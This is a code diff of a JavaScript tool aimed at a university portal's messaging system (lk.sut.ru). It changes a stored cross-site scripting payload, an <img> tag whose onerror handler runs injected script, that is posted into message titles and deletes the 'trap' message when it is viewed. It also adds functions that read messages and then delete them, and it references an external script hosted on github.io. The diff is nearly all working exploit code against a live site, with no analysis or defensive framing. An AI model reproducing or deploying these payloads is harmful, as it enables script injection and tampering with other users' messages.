@@ -1,12 +1,13 @@
 const MESSAGE_LINK = 'https://lk.sut.ru/cabinet/project/cabinet/forms/message.php';
+const MESSAGE_LINK_2 = 'https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php';
 // Шаблон данных idinfo=0&item=0&title=&mes_otvet=test&adresat=97130&saveotv;
 const SCRIPT_LINK = 'https://thealexgo.github.io/forHTML_Academy/js/script.js';
-const IMAGE_SRC = 'https://img.com/static/img/img-logo.png';
+const IMAGE_SRC = '1';
 
 const userID = 97130;
 const genData = (title, message) => `idinfo=0&item=0&title=${title}&mes_otvet=${message}&adresat=${userID}&saveotv`;
 // Данные, которые нужны для удаления сообщения с ловушкой
-const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} height=0 onload=jQuery(this).parent().parent().remove()>`, miden);
+const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} style=display:none height=0 onerror=delMsg(jQuery(this).parent().parent().id.replace('tr_',''))>`, miden);
 
 
 function set_Cookie(name, value, expires, path, domain, secure) {
@@ -42,13 +43,13 @@ function sendMiden(){
     $.post(MESSAGE_LINK, DATA_FOR_DELETE(miden));
 }
 
-function delMes(id){
+function delMsg(id){
     // Удаляет сообщение по id
-    $.post(MESSAGE_LINK, "idinfo="+id+"&title=&mes=&adresat=0")
+    $.post(MESSAGE_LINK, `id_del[]=${id}&delmes=2`)
 }
 
 function get_n_clear(id){
     // Читает сообщение id и сразу его удаляет
-    let a = $.post("https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php", data="id="+id+"&prosmotr")
-    setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMes(id) }, 1000)
+    let a = $.post(MESSAGE_LINK_2, data="id="+id+"&prosmotr")
+    setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMsg(id) }, 1000)
 }
